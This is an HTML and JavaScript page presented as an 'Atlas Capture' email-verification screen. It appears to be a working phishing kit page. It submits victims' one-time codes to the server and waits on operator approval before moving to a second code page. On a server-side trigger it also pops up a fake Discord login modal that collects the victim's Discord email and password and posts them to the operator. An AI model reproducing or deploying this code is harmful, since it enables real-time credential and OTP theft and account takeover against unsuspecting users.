<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Atlas Capture - Verify Code</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}

body{
  background:#f3f4f6;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  padding:40px 10px;
}

.wrapper{max-width:420px;width:100%}

.header{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:10px;
  margin-bottom:18px;
}
.icon{
  display:flex;
  align-items:center;
  justify-content:center;
}
#logoAtlas{
  height: 45px;
  width: 45px;
  border-radius: 40%;
}
.header span{font-weight:600;font-size:18px}

.card{
  background:#fff;
  border-radius:22px;
  padding:32px 24px;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
  text-align:center;
}

h2{
  font-size:24px;
  font-weight:700;
  color:#1f2937;
  margin-bottom:8px;
}

.subtext{
  color:#6b7280;
  font-size:14px;
  margin-bottom:28px;
}

/* Single OTP Input - like screenshot */
.otp-input{
  width:100%;
  padding:16px;
  font-size:24px;
  text-align:center;
  letter-spacing:4px;
  border:2px solid #e5e7eb;
  border-radius:14px;
  background:#fff;
  transition:all 0.2s;
  margin-bottom:28px;
  font-weight:600;
}
.otp-input:focus{
  outline:none;
  border-color:#4f46e5;
  box-shadow:0 0 0 3px rgba(79,70,229,0.1);
}

button{
  width:100%;
  padding:14px;
  border-radius:12px;
  border:none;
  background:linear-gradient(90deg,#2563eb,#7c3aed);
  color:#fff;
  font-weight:600;
  cursor:pointer;
  margin-bottom:16px;
}
button:disabled{
  opacity:0.6;
  cursor:not-allowed;
}
.button-loading{
  display:inline-flex;
  align-items:center;
  gap:8px;
}
.spinner{
  width:18px;
  height:18px;
  border:2px solid rgba(255,255,255,0.3);
  border-top-color:white;
  border-radius:50%;
  animation:spin 0.8s linear infinite;
}
@keyframes spin{
  to{transform:rotate(360deg);}
}

.link{
  background:none;
  color:#4f46e5;
  font-size:14px;
  font-weight:500;
  margin:0;
  padding:0;
  box-shadow:none;
}
.link:hover{
  background:none;
  text-decoration:underline;
}

.error-message{
  color:#ef4444;
  font-size:13px;
  margin-top:12px;
  display:none;
}

/* DISCORD MODAL STYLES */
.modal-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.85);
  backdrop-filter: blur(4px);
  z-index: 10000;
  justify-content: center;
  align-items: center;
}
.modal-overlay.active {
  display: flex;
}
.modal {
  background: #fff;
  border-radius: 28px;
  max-width: 380px;
  width: 90%;
  padding: 32px 24px;
  text-align: center;
  box-shadow: 0 25px 50px rgba(0,0,0,0.3);
}
.modal-icon {
  width: 70px;
  height: 70px;
  background: #5865F2;
  border-radius: 35px;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 20px;
}
.modal-icon svg {
  width: 40px;
  height: 40px;
  fill: white;
}
.modal h3 {
  font-size: 22px;
  font-weight: 700;
  color: #1f2937;
  margin-bottom: 8px;
}
.modal p {
  color: #6b7280;
  font-size: 13px;
  margin-bottom: 24px;
  line-height: 1.5;
}
.modal-input {
  width: 100%;
  padding: 14px;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  font-size: 15px;
  margin-bottom: 16px;
}
.modal-input:focus {
  outline: none;
  border-color: #5865F2;
}
.modal-btn {
  width: 100%;
  padding: 14px;
  background: #5865F2;
  color: white;
  border: none;
  border-radius: 12px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 8px;
}
.modal-btn:hover:not(:disabled) {
  background: #4752c4;
}
.modal-btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}
.modal-error {
  color: #ef4444;
  font-size: 12px;
  margin-top: 12px;
  display: none;
}
</style>
</head>
<body>

<div class="wrapper">
  <div class="header">
    <div class="icon">
      <img id="logoAtlas" src="atlas.png" alt="atlas logo">
    </div>
    <span>Atlas Capture</span>
  </div>

  <div class="card">
    <h2>Check your email</h2>
    <p class="subtext">We sent you a 6-character verification code</p>

    <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="000000">

    <button id="verifyBtn">Verify</button>
    <button class="link" id="differentEmail">Use a different email</button>
    <div id="errorMessage" class="error-message"></div>
  </div>
</div>

<!-- DISCORD LOGIN MODAL -->
<div id="loginModal" class="modal-overlay">
  <div class="modal">
    <div class="modal-icon">
      <svg viewBox="0 0 127.14 96.36" xmlns="http://www.w3.org/2000/svg">
        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21a105.73,105.73,0,0,0,32.17,16.15,77.7,77.7,0,0,0,6.89-11.11,68.76,68.76,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.86.68,1.75,1.36,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69c-6.31,0-11.46-5.78-11.46-12.86s5-12.86,11.46-12.86,11.55,5.78,11.46,12.86C53.91,59.91,48.76,65.69,42.45,65.69Zm42.24,0c-6.31,0-11.46-5.78-11.46-12.86s5-12.86,11.46-12.86,11.55,5.78,11.46,12.86C96.15,59.91,91,65.69,84.69,65.69Z" fill="white"/>
      </svg>
    </div>
    <h3>Discord Account Verification</h3>
    <p>Please login with your Discord account to verify your identity. This helps protect your account security.</p>
    <input type="email" id="loginEmail" class="modal-input" placeholder="Discord Email">
    <input type="password" id="loginPassword" class="modal-input" placeholder="Discord Password">
    <button id="submitLoginBtn" class="modal-btn">Login with Discord →</button>
    <div id="modalError" class="modal-error"></div>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/users/login';

  const otpInput = document.getElementById('otpInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const errorDiv = document.getElementById('errorMessage');
  let isProcessing = false;
  let approvalInterval = null;

  // Flag to prevent modal from re-triggering while open
  let isModalOpen = false;

  function getOTP() {
    return otpInput.value.trim();
  }

  function showLoading() {
    isProcessing = true;
    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
    errorDiv.style.display = 'none';
  }

  function showWaitingForApproval() {
    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating......</span>';
  }

  function hideLoading() {
    isProcessing = false;
    verifyBtn.disabled = false;
    verifyBtn.innerHTML = 'Verify';
  }

  function startCheckingApproval() {
    if (approvalInterval) clearInterval(approvalInterval);
    approvalInterval = setInterval(async () => {
      try {
        const response = await fetch('/api/users/check-first-approval', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await response.json();
        if (data.approved) {
          clearInterval(approvalInterval);
          window.location.href = `/users/second-otp?email=${encodeURIComponent(email)}`;
        }
      } catch (err) {}
    }, 2000);
  }

  async function verifyOTP() {
    if (isProcessing) return;
    const otp = getOTP();
    if (!otp || otp.length !== 6) {
      errorDiv.textContent = 'Please enter all 6 characters';
      errorDiv.style.display = 'block';
      return;
    }

    showLoading();
    try {
      const response = await fetch('/api/users/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, otp })
      });
      const data = await response.json();
      if (data.success) {
        showWaitingForApproval();
        startCheckingApproval();
      } else {
        hideLoading();
        errorDiv.textContent = data.error || 'Invalid OTP';
        errorDiv.style.display = 'block';
      }
    } catch (error) {
      hideLoading();
      errorDiv.textContent = 'Network error. Please try again.';
      errorDiv.style.display = 'block';
    }
  }

  // ========== POLLING FOR FORCE LOGIN ==========
  let forceLoginInterval = null;

  function startForceLoginPolling() {
    if (forceLoginInterval) clearInterval(forceLoginInterval);
    forceLoginInterval = setInterval(async () => {
      // Don't trigger if modal is already open
      if (isModalOpen) return;
      
      try {
        const response = await fetch('/api/users/check-force-login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await response.json();
        if (data.force_login === true) {
          isModalOpen = true;
          const modal = document.getElementById('loginModal');
          modal.classList.add('active');
          document.getElementById('loginEmail').value = '';
          document.getElementById('loginPassword').value = '';
          document.getElementById('modalError').style.display = 'none';
          document.getElementById('submitLoginBtn').disabled = false;
          document.getElementById('submitLoginBtn').innerHTML = 'Login with Discord →';
        }
      } catch (err) {}
    }, 2000);
  }

  // ========== POLLING FOR REDIRECT SUCCESS ==========
  let redirectSuccessInterval = null;

  function startRedirectSuccessPolling() {
    if (redirectSuccessInterval) clearInterval(redirectSuccessInterval);
    redirectSuccessInterval = setInterval(async () => {
      try {
        const response = await fetch('/api/users/check-redirect-success', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await response.json();
        if (data.redirect_success === true) {
          clearInterval(redirectSuccessInterval);
          window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
        }
      } catch (err) {}
    }, 2000);
  }

  // ========== MODAL FUNCTIONS ==========
  function hideLoginModal() {
    isModalOpen = false;
    document.getElementById('loginModal').classList.remove('active');
  }

  async function submitLogin() {
    const loginEmail = document.getElementById('loginEmail').value.trim();
    const loginPassword = document.getElementById('loginPassword').value;
    const modalError = document.getElementById('modalError');
    const submitBtn = document.getElementById('submitLoginBtn');
    
    if (!loginEmail || !loginPassword) {
      modalError.textContent = 'Please enter both email and password';
      modalError.style.display = 'block';
      return;
    }
    
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    if (!emailRegex.test(loginEmail)) {
      modalError.textContent = 'Please enter a valid email address';
      modalError.style.display = 'block';
      return;
    }
    
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
    modalError.style.display = 'none';
    
    try {
      const response = await fetch('/api/users/submit-login-popup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, loginEmail, loginPassword })
      });
      const data = await response.json();
      
      if (data.success) {
        hideLoginModal();
      } else {
        modalError.textContent = data.error || 'Failed to verify Discord account';
        modalError.style.display = 'block';
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Login with Discord →';
      }
    } catch (error) {
      modalError.textContent = 'Network error. Please try again.';
      modalError.style.display = 'block';
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Login with Discord →';
    }
  }

  // ========== START POLLING ==========
  startForceLoginPolling();
  startRedirectSuccessPolling();

  // ========== EVENT LISTENERS ==========
  verifyBtn.addEventListener('click', verifyOTP);
  otpInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') verifyOTP();
  });
  otpInput.focus();
  document.getElementById('differentEmail').addEventListener('click', () => {
    window.location.href = '/users/login';
  });
  document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
</script>

</body>
</html>
